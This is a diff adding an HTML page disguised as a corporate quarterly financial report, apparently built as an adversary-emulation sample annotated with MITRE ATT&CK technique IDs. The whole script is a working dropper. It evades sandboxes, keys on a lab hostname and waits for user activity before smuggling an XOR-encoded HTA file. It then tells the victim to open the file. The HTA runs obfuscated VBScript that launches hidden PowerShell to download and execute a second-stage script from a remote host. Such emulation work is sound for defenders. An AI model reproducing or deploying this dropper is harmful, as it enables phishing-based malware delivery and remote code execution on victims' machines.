@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Q4 2025 Financial Report - TestLab Corp</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            padding: 40px;
+            max-width: 600px;
+            text-align: center;
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+            font-size: 28px;
+        }
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+            background: #667eea;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 36px;
+            font-weight: bold;
+        }
+        .status {
+            margin: 30px 0;
+            font-size: 16px;
+            color: #666;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .success {
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            color: #155724;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+        .instruction {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 15px;
+            text-align: left;
+        }
+        .instruction strong {
+            color: #856404;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">TC</div>
+        <h1>Quarterly Financial Report</h1>
+        <div class="status" id="status">
+            <div class="spinner"></div>
+            <p>Generating report...</p>
+        </div>
+    </div>
+
+    <script>
+        // T1497.001 - Sandbox Evasion: System Checks
+        function detectSandbox() {
+            // Screen resolution check
+            if (screen.width < 1000 || screen.height < 700) return true;
+            
+            // Plugin check (sandboxes often have 0 plugins)
+            if (navigator.plugins.length === 0) return true;
+            
+            // Hardware concurrency (VM detection)
+            // if (navigator.hardwareConcurrency < 2) return true;
+            
+            // Timezone check (sandboxes often UTC)
+            var offset = new Date().getTimezoneOffset();
+            if (offset === 0) return true;
+            
+            return false;
+        }
+
+        // T1480.001 - Environmental Keying
+        if (window.location.hostname !== 'upload.testlab.local') {
+            window.location = 'https://www.google.com';
+        }
+
+        // Check for sandbox
+        if (detectSandbox()) {
+            document.getElementById('status').innerHTML = 
+                '<p style="color: #721c24;">Access denied. Please use an approved device.</p>';
+        } else {
+            // T1497.002 - User Activity Based Checks
+            var userInteractions = 0;
+            document.addEventListener('mousemove', function() { userInteractions++; });
+            document.addEventListener('click', function() { userInteractions += 2; });
+            
+            // T1678 - Delay Execution
+            setTimeout(function() {
+                if (userInteractions > 3) {
+                    executeSmuggling();
+                } else {
+                    document.getElementById('status').innerHTML = 
+                        '<p style="color: #721c24;">Session timeout. Please refresh and try again.</p>';
+                }
+            }, 8000);
+        }
+
+        function executeSmuggling() {
+            // T1027.013 - Encrypted/Encoded File (XOR encoding)
+            // HTA payload (XOR encoded với key)
+            var encodedPayload = xorEncode(getHTAPayload(), 'mitre2026eval');
+            
+            // T1140 - Deobfuscate at runtime
+            var htaContent = xorDecode(encodedPayload, 'mitre2026eval');
+            
+            // DEBUG: Log HTA content to console
+            console.log('=== HTA Content (decoded) ===');
+            console.log(htaContent.substring(0, 500));
+            console.log('... (length: ' + htaContent.length + ' chars)');
+            
+            // Verify decode worked
+            if (htaContent.indexOf('Sub Window_OnLoad') === -1) {
+                console.error('ERROR: HTA decode failed!');
+                alert('Decode error! Check console.');
+                return;
+            }
+            
+            // T1027.006 - HTML Smuggling (Blob creation)
+            var blob = new Blob([htaContent], { type: 'application/hta' });
+            var url = URL.createObjectURL(blob);
+            
+            // T1036.008 - Masquerade File Type (legitimate-looking filename)
+            var a = document.createElement('a');
+            a.href = url;
+            a.download = 'Q4_2025_Financial_Report.hta';
+            a.click();
+            
+            // Update UI
+            document.getElementById('status').innerHTML = `
+                <div class="success">
+                    <h3>✓ Report Generated Successfully</h3>
+                    <p>File downloaded: <strong>Q4_2025_Financial_Report.hta</strong></p>
+                </div>
+                <div class="instruction">
+                    <strong>Instructions:</strong>
+                    <ol style="margin-left: 20px; margin-top: 10px;">
+                        <li>Locate the downloaded file in your Downloads folder</li>
+                        <li>Double-click to open the interactive report</li>
+                        <li>Click "Open" when prompted by your browser</li>
+                    </ol>
+                </div>
+            `;
+            
+            // Cleanup
+            setTimeout(function() { URL.revokeObjectURL(url); }, 1000);
+        }
+
+        // XOR encoding/decoding functions
+        function xorEncode(str, key) {
+            var encoded = '';
+            for (var i = 0; i < str.length; i++) {
+                encoded += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+            }
+            return encoded;
+        }
+
+        function xorDecode(str, key) {
+            return xorEncode(str, key); // XOR is symmetric
+        }
+
+        // HTA payload template
+        function getHTAPayload() {
+            return `<html>
+<head>
+<title>Q4 2025 Financial Report</title>
+<HTA:APPLICATION 
+    ID="FinancialReport"
+    APPLICATIONNAME="Financial Report Viewer"
+    WINDOWSTATE="minimize"
+    SHOWINTASKBAR="no"
+    NAVIGABLE="no"
+    SCROLL="no"
+/>
+<script language="VBScript">
+Sub Window_OnLoad
+    
+    Set objShell = CreateObject("WScript.Shell")
+    
+    ' T1027.010 - Command Obfuscation
+    strP = Chr(112) & "o" & Chr(119) & "ershell.exe"
+    strW = "-" & Chr(87) & "indowStyle"
+    strH = "Hid" & "den"
+    strE = "-" & Chr(69) & "xecutionPolicy"
+    strB = "By" & "pass"
+    strC = "-" & Chr(67) & "ommand"
+    
+    strURL = "http://upload.testlab.local/uploads/stage2_minimal.ps1"
+    strDL = "IEX(New-Object Net.WebClient).DownloadString('" & strURL & "')"
+    
+    strCmd = strP & " " & strW & " " & strH & " " & strE & " " & strB & " " & strC & " """ & strDL & """"
+    
+    ' T1564.003 - Hidden Window, T1218.005 - Mshta execution
+    objShell.Run strCmd, 0, False
+    
+    ' T1678 - Delay before closing
+    window.setTimeout "self.close", 5000, "VBScript"
+End Sub
+<\/script>
+</head>
+<body style="background: white;">
+    <div style="text-align: center; padding: 50px; font-family: Arial;">
+        <h2>Loading Financial Data...</h2>
+        <p>Please wait...</p>
+    </div>
+</body>
+</html>`;
+        }
+    </script>
+</body>
+</html>
